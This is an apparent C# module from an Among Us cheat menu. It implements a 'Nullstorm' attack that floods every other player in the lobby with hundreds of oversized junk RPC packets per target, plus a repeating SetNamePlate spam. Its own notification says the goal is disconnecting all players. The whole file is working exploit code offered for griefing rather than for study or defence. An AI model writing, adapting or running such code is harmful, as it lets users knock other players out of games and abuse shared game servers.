using System;
using Hazel;
using UnityEngine;

namespace BaneMenu.modules.troll
{
	/// <summary>
	/// Nullstorm from AuraMenu (AuraCheats.Nullstorm / SendNullstorm / RpcSpam).
	/// Settings fixed to Aura defaults: Delay = 0.07, RPC = SetNamePlate (rpcType 2).
	/// </summary>
	internal static class Nullstorm
	{
		// Aura settings: Delay 0.07, RPC SetNamePlate
		public const float SpamDelay = 0.07f;
		public const int RpcType = 2; // 2 = SetNamePlate

		public static bool RpcSpam;

		private static float rpcTime;

		// AuraMenu AuraCheats.Nullstorm
		public static void Activate()
		{
			try
			{
				// using nullstorm when DTLS is enabled will lag the game (Aura ExtraTab)
				if (ModuleManager.forceDtls != null && ModuleManager.forceDtls.Enabled)
				{
					Bane.notifications.Send("Nullstorm Attack", "First disable DTLS option and rejoin the lobby to do nullstorm attacks.");
					return;
				}

				foreach (PlayerControl val in PlayerControl.AllPlayerControls)
				{
					if (val == null || val.Data == null || val.Data.Disconnected)
						continue;
					if (PlayerControl.LocalPlayer != null && val.PlayerId == PlayerControl.LocalPlayer.PlayerId)
						continue;

					for (int i = 0; i < 7; i++)
					{
						SendNullstorm(val);
					}
				}

				Bane.notifications.Send("Nullstorm Attack", "Nullstorm Activated, disconnecting all players.");
				RpcSpam = true;
			}
			catch
			{
			}
		}

		// AuraMenu AuraCheats.SendNullstorm
		public static void SendNullstorm(PlayerControl target)
		{
			try
			{
				if (AmongUsClient.Instance == null || target == null)
				{
					return;
				}
				for (int i = 0; i < 50; i++)
				{
					try
					{
						MessageWriter val = MessageWriter.Get(SendOption.Reliable);
						val.StartMessage(6);
						val.Write(AmongUsClient.Instance.GameId);
						val.WritePacked(target.OwnerId);
						val.StartMessage(2);
						val.WritePacked(target.NetId);
						val.Write((byte)13);
						string text = new string('A', 1000) + i;
						val.Write(text);
						val.EndMessage();
						val.EndMessage();
						AmongUsClient.Instance.SendOrDisconnect(val);
						val.Recycle();
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// AuraMenu AuraCheats.RpcSpam - Delay 0.07, SetNamePlate
		public static void TickRpcSpam()
		{
			if (!RpcSpam) return;

			if (Time.time < rpcTime) return;

			if (PlayerControl.LocalPlayer == null) return;

			// rpcType 2 = SetNamePlate
			try { PlayerControl.LocalPlayer.SetNamePlate(""); }
			catch { }

			rpcTime = Time.time + SpamDelay;
		}

		public static void Stop()
		{
			RpcSpam = false;
		}
	}
}
